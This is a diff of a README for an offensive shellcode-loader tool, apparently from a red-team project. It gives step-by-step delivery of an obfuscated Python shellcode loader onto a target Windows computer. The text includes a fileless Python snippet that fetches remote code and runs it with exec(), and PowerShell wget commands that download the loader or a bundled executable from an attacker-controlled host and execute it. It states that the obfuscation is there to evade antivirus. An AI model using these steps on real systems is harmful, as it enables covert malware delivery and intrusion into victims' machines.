@@ -20,12 +20,13 @@ Example:
 C:\path\python-3.10.4> python.exe .\Invoke-Python-ShellCodeLoader.py ".\raw-shellcode.bin" ".\obfuscated_shellcodeloader.py"
 ```
 
-- STEP 2. Multiple options exist to download & execute the obfuscated shellcode loader (Python script) on a target Windows computer
+- STEP 2. Multiple options exist to download & execute the obfuscated shellcode loader (Python script) on a target Windows computer.
 
-  - Option A: Utilize a portable signed Python 3 interpreter (www.python.org) + Fileless delivery of the obfuscated shellcode loader (Python script) 
+  - Option A: Utilize a portable signed Python 3 interpreter (www.python.org) + Fileless delivery of the obfuscated shellcode loader (Python script). 
 ```
 1 - Download a signed portable Python 3 interpreter from 'www.python.org'.
     Example:
+    --------
     PS C:\temp\python> wget -uri https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python\python.zip
     PS C:\temp\python> tar -xf .\python.zip; del .\python.zip;
 
@@ -36,7 +37,7 @@ C:\path\python-3.10.4> python.exe .\Invoke-Python-ShellCodeLoader.py ".\raw-shel
     C:\temp\python> type .\Python-fileless-delivery.py
     #Python3
     import urllib.request
-    request = urllib.request.Request('http://website/obfuscated_shellcodeloader.py')
+    request = urllib.request.Request('http://your-IP-or-website/obfuscated_shellcodeloader.py')
     result = urllib.request.urlopen(request)
     payload = result.read()
     exec(payload)
@@ -47,6 +48,7 @@ C:\path\python-3.10.4> python.exe .\Invoke-Python-ShellCodeLoader.py ".\raw-shel
 ```
 1 - Download a signed portable Python 3 interpreter from 'www.python.org'.
     Example:
+    --------
     PS C:\temp\python> wget -uri https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python\python.zip
     PS C:\temp\python> tar -xf .\python.zip; del .\python.zip;
 
@@ -54,10 +56,10 @@ C:\path\python-3.10.4> python.exe .\Invoke-Python-ShellCodeLoader.py ".\raw-shel
     While obfuscation and encryption help evade static analysis by most antivirus solutions, this approach may offer reduced stealth compared to in-memory execution.
     Example:
     --------
-    C:\temp\python> powershell -c "wget -uri http://X.X.X.X/obfuscated_shellcodeloader.py -OutFile C:\temp\python\obfuscated_shellcodeloader.py"
+    C:\temp\python> powershell -c "wget -uri http://your-IP-or-website/obfuscated_shellcodeloader.py -OutFile C:\temp\python\obfuscated_shellcodeloader.py"
     C:\temp\python> python.exe .\obfuscated_shellcodeloader.py
 ```
-  - Option C: Use PyInstaller to bundle the obfuscated shellcode loader Python script into a single executable (e.g. script.exe) and then download and execute it on a target Windows computer
+  - Option C: Use PyInstaller to bundle the obfuscated shellcode loader Python script into a single executable (e.g. script.exe) and then download and execute it on a target Windows computer.
 ```
 1 - Use PyInstaller to bundle the obfuscated shellcode loader Python script into a single executable (e.g. script.exe)
     Example:
@@ -72,7 +74,7 @@ C:\path\python-3.10.4> python.exe .\Invoke-Python-ShellCodeLoader.py ".\raw-shel
     The obfuscation and encryption allow to evade static analysis by most antivirus solutions, though this method may offer reduced stealth compared to in-memory execution.
     Example:
     --------
-    C:\temp> powershell -c "wget -uri http://X.X.X.X/script.exe -OutFile C:\temp\script.exe"
+    C:\temp> powershell -c "wget -uri http://your-IP-or-website/script.exe -OutFile C:\temp\script.exe"
     C:\temp> script.exe
 ```
 
